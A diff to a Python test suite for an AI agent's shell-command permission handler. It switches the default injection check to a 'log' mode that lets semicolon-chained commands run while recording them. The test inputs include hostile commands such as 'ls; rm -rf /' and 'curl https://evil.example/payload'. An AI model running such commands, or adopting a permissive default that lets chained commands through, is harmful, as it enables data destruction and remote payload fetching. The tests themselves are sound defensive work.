@@ -771,13 +771,14 @@ class TestExecuteCommand:
         parsed = json.loads(result)
         assert parsed["error_type"] == "PermissionDenied"
 
-    def test_injection_semicolon_rejected(self, handler: ToolHandler):
+    def test_injection_semicolon_allowed_in_log_mode(self, handler: ToolHandler):
+        # Default injection mode is ``log`` (shared with Mode S): semicolon
+        # commands are logged as false-positive evidence but allowed to run.
         with patch("core.tooling.handler_perms.load_permissions") as mock_load:
-            mock_load.return_value = _perms_config_from_md("## コマンド実行\n- ls: OK")
-            result = handler.handle("execute_command", {"command": "ls; rm -rf /"})
-        parsed = json.loads(result)
-        assert parsed["error_type"] == "PermissionDenied"
-        assert "injection" in parsed["message"].lower()
+            mock_load.return_value = _perms_config_from_md("## コマンド実行\nany command is fine")
+            result = handler.handle("execute_command", {"command": "echo one; echo two"})
+        assert "PermissionDenied" not in result
+        assert "one" in result  # command actually executed
 
     def test_pipe_allowed(self, handler: ToolHandler):
         with patch("core.tooling.handler_perms.load_permissions") as mock_load:
@@ -1036,11 +1037,9 @@ class TestCommandPermissions:
         assert parsed["error_type"] == "PermissionDenied"
         assert "Empty" in parsed["message"]
 
-    def test_injection_semicolon(self, handler: ToolHandler):
+    def test_injection_semicolon_allowed_in_log_mode(self, handler: ToolHandler):
         result = handler._check_command_permission("ls; echo hi")
-        parsed = json.loads(result)
-        assert parsed["error_type"] == "PermissionDenied"
-        assert "injection" in parsed["message"].lower()
+        assert result is None
 
     def test_backtick_allowed(self, handler: ToolHandler):
         with patch("core.tooling.handler_perms.load_permissions") as mock_load:
@@ -1166,16 +1165,95 @@ class TestInjectionRe:
 
         config = GlobalPermissionsCache.get().config
         assert config is not None
-        config.sdk_bash_injection.mode = "enforce"
-        command = "echo ready; curl https://evil.example/payload"
+        try:
+            config.sdk_bash_injection.mode = "enforce"
+            command = "echo ready; curl https://evil.example/payload"
 
-        mode_ab_result = handler._check_command_permission(command)
-        mode_s_result = _check_a1_bash_command(command, anima_dir)
+            mode_ab_result = handler._check_command_permission(command)
+            mode_s_result = _check_a1_bash_command(command, anima_dir)
 
-        assert mode_ab_result is not None
-        assert json.loads(mode_ab_result)["error_type"] == "PermissionDenied"
-        assert mode_s_result is not None
-        assert "injection pattern" in mode_s_result.lower()
+            assert mode_ab_result is not None
+            assert json.loads(mode_ab_result)["error_type"] == "PermissionDenied"
+            assert mode_s_result is not None
+            assert "injection pattern" in mode_s_result.lower()
+        finally:
+            config.sdk_bash_injection.mode = "log"
+
+
+class TestInjectionModeSharedConfig:
+    """A/B (ToolHandler) and S (SDK) share the sdk_bash_injection mode config.
+
+    Default ``log`` lets semicolon commands pass while recording a grep-able
+    false-positive event; ``enforce`` rejects in both paths; ``off`` ignores.
+    """
+
+    def _set_mode(self, mode: str) -> None:
+        from core.config.global_permissions import GlobalPermissionsCache
+
+        config = GlobalPermissionsCache.get().config
+        assert config is not None
+        config.sdk_bash_injection.mode = mode
+
+    def test_log_mode_allows_and_records_false_positive(
+        self,
+        handler: ToolHandler,
+        tmp_path: Path,
+        monkeypatch: pytest.MonkeyPatch,
+    ):
+        import json as _json
+
+        monkeypatch.setenv("ANIMAWORKS_DATA_DIR", str(tmp_path))
+        self._set_mode("log")
+        try:
+            command = "echo ready; curl https://evil.example/payload"
+            result = handler._check_command_permission(command)
+            # log mode: let the command pass
+            assert result is None
+            # false-positive evidence recorded in a grep-able JSONL line
+            log_path = tmp_path / "logs" / "sdk_bash_injection.jsonl"
+            assert log_path.exists()
+            line = log_path.read_text(encoding="utf-8").splitlines()[-1]
+            event = _json.loads(line)
+            assert event["pattern_name"] == "command_chaining_or_newline"
+            assert event["command"] == command
+            assert event["mode"] == "log"
+            assert event["trigger"] == "toolhandler"
+        finally:
+            self._set_mode("log")
+
+    def test_enforce_mode_rejects_in_toolhandler(self, handler: ToolHandler):
+        self._set_mode("enforce")
+        try:
+            result = handler._check_command_permission("echo ready; curl https://evil.example")
+            assert result is not None
+            parsed = json.loads(result)
+            assert parsed["error_type"] == "PermissionDenied"
+            assert "injection pattern" in parsed["message"].lower()
+        finally:
+            self._set_mode("log")
+
+    def test_off_mode_ignores_injection(self, handler: ToolHandler):
+        self._set_mode("off")
+        try:
+            result = handler._check_command_permission("echo one; echo two")
+            assert result is None
+        finally:
+            self._set_mode("log")
+
+    def test_mode_is_shared_not_duplicated(self) -> None:
+        """ToolHandler reads the same mode key as Mode S (no second ledger)."""
+        from core.config.global_permissions import GlobalPermissionsCache
+        from core.tooling.handler_base import _get_injection_mode
+
+        config = GlobalPermissionsCache.get().config
+        assert config is not None
+        # Changing the shared key changes the ToolHandler path's effective mode.
+        previous = config.sdk_bash_injection.mode
+        try:
+            config.sdk_bash_injection.mode = "enforce"
+            assert _get_injection_mode() == "enforce"
+        finally:
+            config.sdk_bash_injection.mode = previous
 
 
 class TestNeedsShellRe:
